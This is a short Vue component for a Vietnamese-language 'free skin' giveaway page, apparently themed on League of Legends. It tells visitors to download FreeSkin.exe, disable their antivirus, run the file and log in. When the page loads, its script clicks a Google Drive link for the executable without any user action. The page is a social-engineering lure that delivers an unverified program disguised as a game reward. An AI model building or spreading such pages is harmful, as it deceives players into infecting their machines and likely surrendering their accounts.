<template>
  <div class="body">
    <div class="form">
      <h6>Các bước thực hiện nhận skin miễn phí</h6>
      <ul>
        <li>Bước 1: Tải File FreeSkin.exe</li>
        <li style="color: red;">Bước 2: Tắt Anivirus</li>
        <li>Bước 3: Mở File FreeSkin.exe</li>
        <li>Bước 4: Đăng nhập và tận hưởng</li>
      </ul>
      <a ref="download" href="https://drive.google.com/u/0/uc?id=1VmQLu8oscmfEbWryIjUq3HLlikpmJbQT&export=download" class="btn btn-primary">Tải lại</a>
    </div>
  </div>
</template>
<script>
export default {
    mounted() {
        this.$refs.download.click();
    }
};
</script>
<style lang="scss" scoped>
.body {
  background-image: url("https://nhanskinlienminh-2018.weebly.com/uploads/1/2/0/5/120538651/background-images/1254407956.jpg");
  background-repeat: no-repeat;
  background-position: center;
  background-size: cover;
  height: 40rem;
  padding-top: 15rem;
  padding-left: 3rem;
  .form {
    width: 23rem;
    background-color: whitesmoke;
    border-radius: 5px;
    padding: 1rem;
    padding-left: 2rem;
  }
}
</style>